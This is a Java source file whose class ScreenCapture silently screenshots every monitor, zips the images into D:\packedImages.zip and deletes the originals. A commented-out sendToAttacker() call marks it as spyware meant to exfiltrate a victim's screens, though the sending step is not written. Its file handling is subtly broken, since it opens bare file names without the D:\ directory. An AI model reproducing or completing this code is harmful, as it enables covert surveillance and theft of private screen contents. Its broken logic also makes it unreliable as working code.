package it.justDo.misc;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Date;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ScreenCapture {

    private static final String IMAGE_FORMAT = "png";
    private static final String DESTINATION = "D:\\";
    private static final String FILE_PATTERN = "capture_[0-9]+_[0-9]+\\." + IMAGE_FORMAT;
    private static final String ZIP_FILE = "packedImages.zip";
    private static final int DEPTH = 1;
    private static int ID = 1;
    private Robot robot = new Robot();

    public static void main(String[] args) {
        try {
            new ScreenCapture();
        } catch (InterruptedException | IOException | AWTException e) {
            e.printStackTrace();
        }
    }

    public ScreenCapture() throws InterruptedException, AWTException, IOException {
        this(0);
    }

    public ScreenCapture(int delay) throws InterruptedException, AWTException, IOException {
        Thread.sleep(delay);
        captureAllMonitors();
        packAndSend();
    }

    private void captureAllMonitors() throws IOException {
        GraphicsEnvironment graphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] screenDevices = graphicsEnvironment.getScreenDevices();
        iterateAllDevices(screenDevices);
    }

    private void iterateAllDevices(GraphicsDevice[] screenDevices) throws IOException {
        for(GraphicsDevice device : screenDevices)
        {
            GraphicsConfiguration[] configurations = device.getConfigurations();
            for(GraphicsConfiguration monitor : configurations)
            {
                captureAndSave(monitor.getBounds());
            }
        }
    }

    private void captureAndSave(Rectangle bounds) throws IOException {
        BufferedImage image = robot.createScreenCapture(bounds);
        saveImage(image);
    }

    private void saveImage(BufferedImage image) throws IOException {
        final File path = new File(getFullPath());
        ImageIO.write(image, IMAGE_FORMAT, path);
    }

    @Deprecated
    private Rectangle getSingleScreen() {
        return new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
    }

    private String getFullPath() {
        return DESTINATION + "capture_" + getMilliseconds() + "_" + (ID++) + "." + IMAGE_FORMAT;
    }

    private static String getMilliseconds() {
        return Long.toString(new Date().getTime());
    }

    private void packAndSend() throws IOException {
        String[] images = getCapturedImages();
        packImages(images);
        removeImages(images);
//        sendToAttacker();
    }

    private String[] getCapturedImages() throws IOException {
        return Files.walk(Paths.get(DESTINATION), DEPTH)
                .map(name -> name.getFileName().toString()) // TODO not null
                .filter(predicate -> predicate.matches(FILE_PATTERN))
                .toArray(String[]::new);
    }

    private void packImages(String[] images) throws IOException {
        try(ZipOutputStream zipStream = new ZipOutputStream(new FileOutputStream(DESTINATION + ZIP_FILE))) {
            for (String file : images) {
                try (FileInputStream inputStream = new FileInputStream(file)) {
                    String name = new File(file).getName();
                    ZipEntry entry = new ZipEntry(name);
                    zipStream.putNextEntry(entry);
                    writeRawBytes(zipStream, inputStream);
                }
            }
        }
    }

    private void writeRawBytes(ZipOutputStream zipStream, FileInputStream inputStream) throws IOException {
        byte[] readBuffer = new byte[4096];
        int amountRead;
        while ((amountRead = inputStream.read(readBuffer)) > 0) {
            zipStream.write(readBuffer, 0, amountRead);
        }
    }

    private void removeImages(String[] images) {
        for (String file : images) {
            new File(file).delete();
        }
    }
}
